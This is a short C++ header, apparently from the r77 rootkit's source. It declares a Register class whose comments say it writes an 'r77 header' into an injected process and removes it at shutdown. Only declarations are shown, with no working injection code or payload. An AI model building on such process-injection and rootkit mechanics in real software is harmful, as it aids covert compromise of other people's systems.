/// <summary>
/// Class that writes the r77 header to the injected process.
/// </summary>
class Register
{
public:
	/// <summary>
	/// Register r77 by writing the r77 header.
	/// </summary>
	/// <returns>
	/// true, if the header was written and r77 can run;
	/// false, if r77 should detach from this process.
	/// </returns>
	static bool Initialize();
	/// <summary>
	/// Removes the r77 header from this process.
	/// </summary>
	static void Shutdown();
};